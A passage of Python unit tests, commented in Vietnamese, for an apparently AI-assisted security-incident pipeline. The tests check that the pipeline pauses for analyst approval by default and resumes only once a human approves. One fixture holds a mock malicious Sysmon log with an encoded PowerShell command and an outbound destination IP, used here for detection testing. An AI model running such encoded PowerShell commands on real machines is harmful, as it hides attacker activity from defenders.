        # Ghi nhận transition Self-Correction
        escalate_records = [
            t for t in enriched_state.history
            if t.metadata.get("escalated") is True
        ]
        self.assertEqual(len(escalate_records), 1)
        self.assertEqual(escalate_records[0].metadata["highest_threat_score"], 92)

    def test_default_auto_approve_false_pauses_at_awaiting_approval(self):
        """Kiểm thử mặc định auto_approve=False:
        Khi có hành động yêu cầu duyệt (require_human_approval=True), pipeline phải chuyển trạng thái
        sang AWAITING_APPROVAL và dừng lại trong invoke() (không tự duyệt, không chạy reporting).
        """
        orch = StateGraphOrchestrator()  # Sử dụng mặc định auto_approve=False
        self.assertFalse(orch.auto_approve)

        malicious_raw = json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc AAAAA==",
            "DestinationIp": "194.26.29.112",
        })
        state = IncidentState(
            incident_id="INC-DEFAULT-HITL-001",
            raw_logs=[RawLogInput(log_source="Sysmon", raw_payload=malicious_raw)]
        )

        final_state = orch.invoke(state)

        # 1. Pipeline dừng ở AWAITING_APPROVAL
        self.assertEqual(final_state.status, IncidentStatus.AWAITING_APPROVAL)
        # 2. Không tự gán analyst_approved = True
        self.assertIsNone(final_state.analyst_approved)
        # 3. Không tự sinh báo cáo
        self.assertIsNone(final_state.final_report)
        # 4. Các hành động yêu cầu duyệt vẫn chưa được duyệt (is_approved=None)
        pending_actions = [a for a in final_state.recommended_actions if a.require_human_approval]
        self.assertGreaterEqual(len(pending_actions), 1)
        for act in pending_actions:
            self.assertIsNone(act.is_approved)

        # 5. Tiếp tục với resume_after_hitl
        resumed_state = orch.resume_after_hitl(
            final_state,
            analyst_approved=True,
            analyst_feedback="Chuyên viên phê duyệt hành động ứng phó"
        )
        self.assertEqual(resumed_state.status, IncidentStatus.RESOLVED)
        self.assertIsNotNone(resumed_state.final_report)
        self.assertTrue(resumed_state.analyst_approved)

    def test_create_full_soc_pipeline_default_auto_approve_false(self):
        """Kiểm thử create_full_soc_pipeline mặc định auto_approve=False."""
        from src.core.orchestrator import create_full_soc_pipeline
        pipeline = create_full_soc_pipeline()
        self.assertFalse(pipeline.auto_approve)


if __name__ == "__main__":
    unittest.main()



